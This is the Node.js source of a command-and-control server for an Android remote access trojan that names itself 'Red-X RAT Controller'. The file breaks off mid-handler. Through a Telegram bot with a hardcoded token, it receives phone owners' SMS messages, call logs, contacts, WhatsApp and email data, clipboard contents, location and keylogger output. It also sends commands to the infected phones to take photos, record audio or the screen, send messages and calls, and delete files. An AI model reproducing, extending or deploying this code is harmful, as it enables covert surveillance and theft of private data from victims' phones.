const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// ========== CONFIGURATION ==========
const BOT_TOKEN = process.env.BOT_TOKEN || '8687604678:AAEJmrEYTLGri3gATkS343HRvMKwzWA-DMY';
const BOT_CHAT_ID = process.env.BOT_CHAT_ID || '8604942344';
const PORT = process.env.PORT || 3000;

// ========== INITIALIZE ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

// ========== TELEGRAM BOT ==========
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Bot is running...');

// ========== STORAGE ==========
const connectedDevices = new Map(); // socketId -> deviceId
const appData = new Map(); // deviceId -> data
const commandQueue = new Map(); // requestId -> { chatId, command }

// ========== MAIN KEYBOARD ==========
function getMainKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📱 Device Info', '📊 Status'],
                ['📨 SMS', '📞 Call'],
                ['📷 Camera', '🎥 Video'],
                ['🎬 Screen Record', '📸 Screenshot'],
                ['🎤 Mic', '🔊 Volume'],
                ['📁 Files', '📍 Location'],
                ['👥 Contacts', '📋 Clipboard'],
                ['🔦 Flashlight', '📶 WiFi'],
                ['📡 Bluetooth', '✈️ Airplane'],
                ['🌙 DND', '📳 Vibrate'],
                ['🔄 Reboot', '💀 Kill App'],
                ['📨 SMS Forward', '📤 Upload File'],
                ['⬇️ Download', '🗑️ Delete'],
                ['📂 List Files', '⚙️ System Info'],
                ['📱 Running Apps', '🧹 Clear Cache'],
                ['🔐 Keylogger', '📱 Remote Control']
            ],
            resize_keyboard: true
        }
    };
}

// ========== HELPER FUNCTIONS ==========
function broadcastToAll(event, data) {
    io.emit(event, data);
}

function broadcastToDevice(deviceId, event, data) {
    for (let [socketId, id] of connectedDevices) {
        if (id === deviceId) {
            io.to(socketId).emit(event, data);
            return true;
        }
    }
    return false;
}

function getConnectedDevicesList() {
    return Array.from(connectedDevices.values());
}

function sendCommandToDevice(chatId, command, extras = {}, target = 'all') {
    const requestId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const payload = {
        request: command,
        extras: extras,
        requestId: requestId,
        from: 'telegram'
    };

    commandQueue.set(requestId, { chatId, command, timestamp: Date.now() });

    let sent = false;
    if (target !== 'all') {
        sent = broadcastToDevice(target, 'message', payload);
    } else {
        broadcastToAll('message', payload);
        sent = true;
    }

    if (sent) {
        bot.sendMessage(chatId, `📤 Command "${command}" sent to ${target === 'all' ? 'ALL devices' : target}`);
    } else {
        bot.sendMessage(chatId, `❌ No device found: ${target}`);
    }
}

// ========== SOCKET.IO ==========
io.on('connection', (socket) => {
    console.log(`🔌 Client connected: ${socket.id}`);
    const deviceId = socket.handshake.query.deviceId || `device_${socket.id.substring(0, 8)}`;
    const platform = socket.handshake.query.platform || 'unknown';

    connectedDevices.set(socket.id, deviceId);
    
    if (!appData.has(deviceId)) {
        appData.set(deviceId, {
            id: deviceId,
            platform: platform,
            connectedAt: new Date().toISOString(),
            lastHeartbeat: new Date().toISOString()
        });
    }

    console.log(`📱 Device connected: ${deviceId}`);

    // Send welcome to Telegram
    bot.sendMessage(BOT_CHAT_ID, 
        `📱 *New Device Connected*\n🆔: \`${deviceId}\`\n📱 Platform: ${platform}`,
        { parse_mode: 'Markdown', ...getMainKeyboard() }
    );

    // ========== HANDLE DEVICE INFO ==========
    socket.on('deviceInfo', (data) => {
        try {
            const info = typeof data === 'string' ? JSON.parse(data) : data;
            const current = appData.get(deviceId) || {};
            appData.set(deviceId, { ...current, ...info, lastUpdate: new Date().toISOString() });
            console.log(`📊 Device info updated for ${deviceId}`);
            
            // Send to Telegram
            bot.sendMessage(BOT_CHAT_ID,
                `📊 *Device Info Update*\n🆔: ${deviceId}\n📱 Model: ${info.model || 'Unknown'}\n📱 Android: ${info.androidVersion || 'Unknown'}\n🔋 Battery: ${info.battery || 'Unknown'}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
        } catch (e) {
            console.error('Device info error:', e);
        }
    });

    // ========== HANDLE RESPONSES ==========
    socket.on('response', (data) => {
        console.log(`📩 Response from ${deviceId}:`, data);
        
        const requestId = data.requestId;
        const queueItem = commandQueue.get(requestId);
        
        if (queueItem) {
            bot.sendMessage(queueItem.chatId,
                `📨 *Command Response*\n📱 From: ${deviceId}\n📌 Command: ${queueItem.command}\n📦 Data: ${JSON.stringify(data.response || data, null, 2)}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
            commandQueue.delete(requestId);
        } else {
            bot.sendMessage(BOT_CHAT_ID,
                `📨 *Response from ${deviceId}*\n${JSON.stringify(data, null, 2)}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
        }
    });

    // ========== HANDLE LOCATION ==========
    socket.on('location', (data) => {
        const lat = data.latitude || data.lat || 'Unknown';
        const lng = data.longitude || data.lng || 'Unknown';
        
        bot.sendMessage(BOT_CHAT_ID,
            `📍 *Location from ${deviceId}*\n🌐 Latitude: ${lat}\n🌐 Longitude: ${lng}\n🎯 Accuracy: ${data.accuracy || 'N/A'}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
        
        // Send Google Maps link
        if (lat !== 'Unknown' && lng !== 'Unknown') {
            bot.sendLocation(BOT_CHAT_ID, parseFloat(lat), parseFloat(lng));
        }
    });

    // ========== HANDLE FILE LIST ==========
    socket.on('fileList', (data) => {
        const files = Array.isArray(data) ? data : (data.apps || data.files || []);
        let message = `📂 *Files from ${deviceId}*\n`;
        message += `📁 Total: ${files.length}\n\n`;
        
        files.slice(0, 20).forEach((file, index) => {
            const isDir = file.isDirectory ? '📁' : '📄';
            const size = file.size ? `(${formatSize(file.size)})` : '';
            message += `${index + 1}. ${isDir} ${file.name || 'Unknown'} ${size}\n`;
        });
        
        if (files.length > 20) {
            message += `\n... and ${files.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE APP LIST ==========
    socket.on('appList', (data) => {
        const apps = data.apps || data || [];
        let message = `📱 *Apps on ${deviceId}*\n`;
        message += `📊 Total: ${apps.length}\n\n`;
        
        // Show system apps count
        const systemApps = apps.filter(a => a.isSystem).length;
        const userApps = apps.filter(a => a.isUser).length;
        message += `📱 User Apps: ${userApps}\n⚙️ System Apps: ${systemApps}\n\n`;
        
        apps.slice(0, 15).forEach((app, index) => {
            const type = app.isSystem ? '⚙️' : '📱';
            message += `${index + 1}. ${type} ${app.name || app.packageName}\n`;
        });
        
        if (apps.length > 15) {
            message += `\n... and ${apps.length - 15} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE RUNNING APPS ==========
    socket.on('runningApps', (data) => {
        const apps = data.apps || data || [];
        let message = `🔄 *Running Apps on ${deviceId}*\n`;
        message += `📊 Total: ${apps.length}\n\n`;
        
        apps.slice(0, 15).forEach((app, index) => {
            message += `${index + 1}. ${app.name || app.packageName} (PID: ${app.pid || 'N/A'})\n`;
        });
        
        if (apps.length > 15) {
            message += `\n... and ${apps.length - 15} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE WHATSAPP STATUS ==========
    socket.on('whatsappStatus', (data) => {
        const installed = data.installed ? '✅ Installed' : '❌ Not Installed';
        const version = data.versionName ? `\n📌 Version: ${data.versionName}` : '';
        bot.sendMessage(BOT_CHAT_ID,
            `💬 *WhatsApp Status*\n📱 Device: ${deviceId}\n📊 Status: ${installed}${version}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
    });

    // ========== HANDLE WHATSAPP CONTACTS ==========
    socket.on('whatsappContacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👥 *WhatsApp Contacts*\n📱 Device: ${deviceId}\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 20).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - ${contact.number || 'N/A'}\n`;
        });
        
        if (contacts.length > 20) {
            message += `\n... and ${contacts.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE EMAILS ==========
    socket.on('emailList', (data) => {
        const emails = Array.isArray(data) ? data : [];
        let message = `📧 *Emails on ${deviceId}*\n📊 Total: ${emails.length}\n\n`;
        
        emails.slice(0, 15).forEach((email, index) => {
            message += `${index + 1}. ${email.name || 'Unknown'} - ${email.email}\n`;
        });
        
        if (emails.length > 15) {
            message += `\n... and ${emails.length - 15} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE SMS LIST ==========
    socket.on('smsList', (data) => {
        const smsList = Array.isArray(data) ? data : [];
        let message = `📨 *SMS Messages*\n📱 Device: ${deviceId}\n📊 Total: ${smsList.length}\n\n`;
        
        smsList.slice(0, 10).forEach((sms, index) => {
            message += `${index + 1}. From: ${sms.from || 'Unknown'}\n   📝 ${sms.message || ''}\n   🕐 ${sms.time || 'N/A'}\n\n`;
        });
        
        if (smsList.length > 10) {
            message += `... and ${smsList.length - 10} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE CALL LOGS ==========
    socket.on('callLogs', (data) => {
        const calls = Array.isArray(data) ? data : [];
        let message = `📞 *Call Logs*\n📱 Device: ${deviceId}\n📊 Total: ${calls.length}\n\n`;
        
        const emojis = { 'Incoming': '📥', 'Outgoing': '📤', 'Missed': '❌' };
        calls.slice(0, 15).forEach((call, index) => {
            const emoji = emojis[call.type] || '📞';
            message += `${index + 1}. ${emoji} ${call.name || call.number || 'Unknown'}\n`;
            message += `   📌 Type: ${call.type || 'Unknown'}\n`;
            message += `   ⏱️ Duration: ${call.duration || 'N/A'}\n`;
            message += `   🕐 ${call.time || 'N/A'}\n\n`;
        });
        
        if (calls.length > 15) {
            message += `... and ${calls.length - 15} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE CONTACTS ==========
    socket.on('contacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👥 *Contacts on ${deviceId}*\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 20).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - ${contact.number || 'N/A'}\n`;
        });
        
        if (contacts.length > 20) {
            message += `\n... and ${contacts.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE SYSTEM INFO ==========
    socket.on('systemInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `⚙️ *System Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📱 Model: ${info.model || 'Unknown'}\n`;
        message += `📱 Android: ${info.androidVersion || 'Unknown'}\n`;
        message += `🔧 CPU: ${info.cpu || 'Unknown'}\n`;
        message += `⚡ Cores: ${info.cores || 'Unknown'}\n`;
        message += `💾 RAM Total: ${info.totalRam || 'Unknown'}\n`;
        message += `💾 RAM Available: ${info.availableRam || 'Unknown'}\n`;
        message += `💾 RAM Used: ${info.usedRam || 'Unknown'}\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE FULL DEVICE INFO ==========
    socket.on('fullDeviceInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *Full Device Info*\n🆔: ${deviceId}\n\n`;
        message += `📱 Model: ${info.model || 'Unknown'}\n`;
        message += `🏷️ Brand: ${info.brand || 'Unknown'}\n`;
        message += `📱 Android: ${info.androidVersion || 'Unknown'}\n`;
        message += `🔧 API Level: ${info.apiLevel || 'Unknown'}\n`;
        message += `🔋 Battery: ${info.batteryLevel || 'Unknown'}%\n`;
        message += `💾 Storage Total: ${info.totalStorage || 'Unknown'}\n`;
        message += `💾 Storage Available: ${info.availableStorage || 'Unknown'}\n`;
        message += `💾 RAM Total: ${info.totalRam || 'Unknown'}\n`;
        message += `💾 RAM Available: ${info.availableRam || 'Unknown'}\n`;
        message += `📶 WiFi: ${info.wifiEnabled ? '✅ ON' : '❌ OFF'}\n`;
        message += `📡 Bluetooth: ${info.bluetoothEnabled ? '✅ ON' : '❌ OFF'}\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE BATTERY INFO ==========
    socket.on('batteryInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `🔋 *Battery Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📊 Level: ${info.level || 'Unknown'}%\n`;
        message += `⚡ Status: ${info.status || 'Unknown'}\n`;
        message += `🔌 Plugged: ${info.plugged || 'Unknown'}\n`;
        message += `❤️ Health: ${info.health || 'Unknown'}\n`;
        message += `🌡️ Temperature: ${info.temperature || 'Unknown'}°C\n`;
        message += `⚡ Voltage: ${info.voltage || 'Unknown'}mV\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE NETWORK INFO ==========
    socket.on('networkInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📶 *Network Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📶 WiFi: ${info.wifiEnabled ? '✅ ON' : '❌ OFF'}\n`;
        if (info.wifiSSID) {
            message += `📡 SSID: ${info.wifiSSID || 'N/A'}\n`;
            message += `📶 Signal: ${info.wifiRSSI || 'N/A'} dBm\n`;
            message += `🚀 Speed: ${info.wifiSpeed || 'N/A'} Mbps\n`;
            message += `🌐 IP: ${info.wifiIPAddress || 'N/A'}\n`;
        }
        message += `📱 Network: ${info.networkOperator || 'N/A'}\n`;
        message += `📶 Network Type: ${info.networkType || 'N/A'}\n`;
        if (info.ipAddress) {
            message += `🌐 IP Address: ${info.ipAddress}\n`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE SIM INFO ==========
    socket.on('simInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *SIM Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📶 SIM State: ${info.simState || 'Unknown'}\n`;
        message += `📱 Network: ${info.networkOperator || 'Unknown'}\n`;
        message += `📶 Network Code: ${info.networkOperatorCode || 'Unknown'}\n`;
        message += `📱 Phone Type: ${info.phoneType || 'Unknown'}\n`;
        message += `🌍 Country: ${info.simCountryIso || 'Unknown'}\n`;
        message += `📱 Operator: ${info.simOperatorName || 'Unknown'}\n`;
        if (info.phoneCount) {
            message += `📱 Phone Count: ${info.phoneCount}\n`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE STORAGE STATS ==========
    socket.on('storageStats', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `💾 *Storage Stats*\n📱 Device: ${deviceId}\n\n`;
        message += `📁 Internal:\n`;
        message += `   📊 Total: ${info.internalTotal || 'Unknown'}\n`;
        message += `   📊 Available: ${info.internalAvailable || 'Unknown'}\n`;
        message += `   📊 Used: ${info.internalUsed || 'Unknown'}\n`;
        if (info.externalTotal) {
            message += `\n📁 External:\n`;
            message += `   📊 Total: ${info.externalTotal}\n`;
            message += `   📊 Available: ${info.externalAvailable}\n`;
            message += `   📊 Used: ${info.externalUsed}\n`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE WIFI NETWORKS ==========
    socket.on('wifiNetworks', (data) => {
        const networks = Array.isArray(data) ? data : [];
        let message = `📶 *WiFi Networks*\n📱 Device: ${deviceId}\n📊 Total: ${networks.length}\n\n`;
        
        networks.slice(0, 15).forEach((network, index) => {
            const lock = network.capabilities && network.capabilities.includes('WPA') ? '🔒' : '🔓';
            message += `${index + 1}. ${lock} ${network.ssid || 'Hidden'}\n`;
            message += `   📶 Signal: ${network.strength || 'N/A'}\n`;
            message += `   📡 BSSID: ${network.bssid || 'N/A'}\n\n`;
        });
        
        if (networks.length > 15) {
            message += `... and ${networks.length - 15} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE BLUETOOTH DEVICES ==========
    socket.on('bluetoothDevices', (data) => {
        const devices = Array.isArray(data) ? data : [];
        let message = `📡 *Bluetooth Devices*\n📱 Device: ${deviceId}\n📊 Total: ${devices.length}\n\n`;
        
        devices.forEach((device, index) => {
            message += `${index + 1}. ${device.name || 'Unknown'} (${device.address || 'N/A'})\n`;
        });
        
        if (devices.length === 0) {
            message += 'No paired devices found';
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE APP INFO ==========
    socket.on('appInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *App Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📱 Name: ${info.name || 'Unknown'}\n`;
        message += `📦 Package: ${info.packageName || 'Unknown'}\n`;
        message += `📌 Version: ${info.versionName || 'Unknown'}\n`;
        message += `🔢 Code: ${info.versionCode || 'Unknown'}\n`;
        message += `⚙️ System: ${info.isSystem ? '✅ Yes' : '❌ No'}\n`;
        message += `📅 Installed: ${info.installTime || 'Unknown'}\n`;
        message += `🔄 Updated: ${info.updateTime || 'Unknown'}\n`;
        if (info.permissions && info.permissions.length > 0) {
            message += `\n🔐 Permissions: ${info.permissions.length}\n`;
            info.permissions.slice(0, 10).forEach(p => message += `   - ${p}\n`);
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE FILE INFO ==========
    socket.on('fileInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📄 *File Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📄 Name: ${info.name || 'Unknown'}\n`;
        message += `📂 Path: ${info.path || 'Unknown'}\n`;
        message += `📦 Size: ${info.size || 'Unknown'}\n`;
        message += `📁 Type: ${info.isDirectory ? 'Directory' : 'File'}\n`;
        message += `🔒 Hidden: ${info.isHidden ? '✅ Yes' : '❌ No'}\n`;
        message += `📝 Read: ${info.canRead ? '✅' : '❌'}\n`;
        message += `✏️ Write: ${info.canWrite ? '✅' : '❌'}\n`;
        message += `🕐 Modified: ${info.lastModified || 'Unknown'}\n`;
        if (info.childCount !== undefined) {
            message += `📁 Contents: ${info.childCount} items\n`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== HANDLE CLIPBOARD ==========
    socket.on('clipboard', (data) => {
        const text = typeof data === 'string' ? data : (data.text || data.clipboard || JSON.stringify(data));
        bot.sendMessage(BOT_CHAT_ID,
            `📋 *Clipboard Content*\n📱 Device: ${deviceId}\n\n📝 ${text.substring(0, 500)}${text.length > 500 ? '...' : ''}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
    });

    // ========== HANDLE SMS FORWARD ==========
    socket.on('smsForward', (data) => {
        bot.sendMessage(BOT_CHAT_ID,
            `📨 *SMS Forwarded*\n📱 Device: ${deviceId}\n📱 From: ${data.from || 'Unknown'}\n📝 Message: ${data.message || ''}\n🕐 Time: ${data.time || 'N/A'}`,
            { parse_mode: 'Markdown', ...getMainKeyboard() }
        );
    });

    // ========== HANDLE HEARTBEAT ==========
    socket.on('heartbeat', (data) => {
        const current = appData.get(deviceId) || {};
        appData.set(deviceId, { ...current, lastHeartbeat: new Date().toISOString() });
    });

    // ========== DISCONNECT ==========
    socket.on('disconnect', () => {
        console.log(`🔌 Client disconnected: ${socket.id}`);
        const id = connectedDevices.get(socket.id);
        if (id) {
            connectedDevices.delete(socket.id);
            bot.sendMessage(BOT_CHAT_ID,
                `📱 *Device Disconnected*\n🆔: ${id}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
        }
    });
});

// ========== TELEGRAM BOT COMMANDS ==========

// /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    
    bot.sendMessage(chatId,
        `🚀 *Red-X RAT Controller*\n\n` +
        `📱 Connected Devices: ${connectedDevices.size}\n` +
        `🔌 Use buttons below to control your devices!\n\n` +
        `📌 *Quick Commands:*\n` +
        `/status - Device status\n` +
        `/list - List devices\n` +
        `/help - All commands`,
        { parse_mode: 'Markdown', ...getMainKeyboard() }
    );
});

// /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    bot.sendMessage(chatId,
        `📚 *Red-X RAT Commands*\n\n` +
        `📱 *Basic:*\n` +
        `/status - Device status\n` +
        `/list - List devices\n` +
        `/device - Full device info\n\n` +
        `📷 *Media:*\n` +
        `/camera - Take photo\n` +
        `/video - Record video\n` +
        `/screenshot - Take screenshot\n` +
        `/screenrecord - Record screen\n` +
        `/mic - Record audio\n\n` +
        `🔦 *System:*\n` +
        `/flash on|off - Flashlight\n` +
        `/wifi on|off - WiFi\n` +
        `/bt on|off - Bluetooth\n` +
        `/airplane - Airplane mode\n` +
        `/dnd - Do Not Disturb\n` +
        `/reboot - Reboot device\n` +
        `/lock - Lock screen\n\n` +
        `📨 *Communication:*\n` +
        `/sms +123|Hello - Send SMS\n` +
        `/call +123 - Make call\n` +
        `/smslist - List all SMS\n` +
        `/calllogs - Call history\n\n` +
        `📁 *Files:*\n` +
        `/files /sdcard - List files\n` +
        `/delete /path - Delete file\n` +
        `/fileinfo /path - File info\n` +
        `/mkdir /path - Create folder\n` +
        `/storage - Storage stats\n\n` +
        `📱 *Apps:*\n` +
        `/apps - List all apps\n` +
        `/running - Running apps\n` +
        `/appinfo com.package - App info\n` +
        `/open com.package - Open app\n` +
        `/kill com.package - Kill app\n\n` +
        `💬 *WhatsApp:*\n` +
        `/whatsapp +123|Hello - Send WhatsApp\n` +
        `/whatsappcheck - Check installed\n` +
        `/whatsappcontacts - Get contacts\n\n` +
        `📧 *Emails:*\n` +
        `/emails - List emails\n` +
        `/emailcontacts - Email contacts\n\n` +
        `📍 *Location:*\n` +
        `/location - Get location\n` +
        `/contacts - Get contacts\n\n` +
        `📋 *Clipboard:*\n` +
        `/clipboardget - Get clipboard\n` +
        `/clipboardset Hello - Set clipboard\n\n` +
        `📶 *Network:*\n` +
        `/wifi - WiFi networks\n` +
        `/bt - Bluetooth devices\n` +
        `/sim - SIM info\n` +
        `/network - Network info\n` +
        `/battery - Battery info\n\n` +
        `🔐 *Keylogger:*\n` +
        `/keylogger start|stop - Control keylogger\n` +
        `/keylogget - Get keylogs\n\n` +
        `📨 *SMS Forward:*\n` +
        `/forward on|off - SMS forwarding\n\n` +
        `🔄 *Misc:*\n` +
        `/vibrate 500 - Vibrate\n` +
        `/wallpaper /path - Set wallpaper\n` +
        `/clearnotif - Clear notifications\n` +
        `/reboot - Reboot device`,
        { parse_mode: 'Markdown', ...getMainKeyboard() }
    );
});

// /status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    let status = `📊 *Device Status*\n`;
    status += `📱 Connected: ${connectedDevices.size}\n\n`;
    
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        status += `🆔 *${deviceId}*\n`;
        status += `   📱 Platform: ${info.platform || 'unknown'}\n`;
        status += `   🔌 Connected: ${info.connectedAt || 'recently'}\n`;
        status += `   ❤️ Last Heartbeat: ${info.lastHeartbeat ? new Date(info.lastHeartbeat).toLocaleString() : 'N/A'}\n\n`;
    }

    if (connectedDevices.size === 0) {
        status += 'No devices connected. Open the APK on your phone.';
    }

    bot.sendMessage(chatId, status, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /list
bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    let response = `📱 *Connected Devices (${connectedDevices.size})*\n\n`;
    if (connectedDevices.size === 0) {
        response += 'No devices connected. Open the APK on your phone.';
    }
    for (let [socketId, deviceId] of connectedDevices) {
        const info = appData.get(deviceId) || {};
        response += `🆔 \`${deviceId}\`\n`;
        response += `   📱 ${info.platform || 'Android'}\n`;
        response += `   🔌 ${info.connectedAt ? 'Active' : 'Unknown'}\n\n`;
    }
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /device - Full device info
bot.onText(/\/device/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getFullDeviceInfo');
});

// /camera
bot.onText(/\/camera/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'takePhoto');
});

// /video
bot.onText(/\/video/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'takeVideo');
});

// /screenshot
bot.onText(/\/screenshot/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'takeScreenshot');
});

// /screenrecord
bot.onText(/\/screenrecord/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'screenRecord');
});

// /mic
bot.onText(/\/mic/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'recordAudio');
});

// /flash
bot.onText(/\/flash (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'flashlightOn');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'flashlightOff');
    } else {
        bot.sendMessage(chatId, 'Usage: /flash on|off');
    }
});

// /wifi
bot.onText(/\/wifi (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'wifiOn');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'wifiOff');
    } else {
        bot.sendMessage(chatId, 'Usage: /wifi on|off');
    }
});

// /bt
bot.onText(/\/bt (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const command = match[1].toLowerCase();
    if (command === 'on') {
        sendCommandToDevice(chatId, 'bluetoothOn');
    } else if (command === 'off') {
        sendCommandToDevice(chatId, 'bluetoothOff');
    } else {
        bot.sendMessage(chatId, 'Usage: /bt on|off');
    }
});

// /airplane
bot.onText(/\/airplane/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'airplaneMode');
});

// /dnd
bot.onText(/\/dnd/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'doNotDisturb');
});

// /reboot
bot.onText(/\/reboot/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'reboot');
});

// /lock
bot.onText(/\/lock/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'lockScreen');
});

// /sms
bot.onText(/\/sms (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    const parts = match[1].split('|');
    if (parts.length === 2) {
        sendCommandToDevice(chatId, 'sendSms', { target: parts[0].trim(), message: parts[1].trim() });
    } else {
        bot.sendMessage(chatId, 'Usage: /sms +1234567890|Your message');
    }
});

// /call
bot.onText(/\/call (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'makeCall', { target: match[1].trim() });
});

// /smslist
bot.onText(/\/smslist/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getAllSms');
});

// /calllogs
bot.onText(/\/calllogs/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'getCallLogs');
});

// /files
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'listFiles', { path: match[1].trim() });
});

// /delete
bot.onText(/\/delete (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    sendCommandToDevice(chatId, 'deleteFile', { path: match[1].trim() });
});

// /fileinfo
bot.onText(/\/fileinfo (.+)/, (msg, match) => {
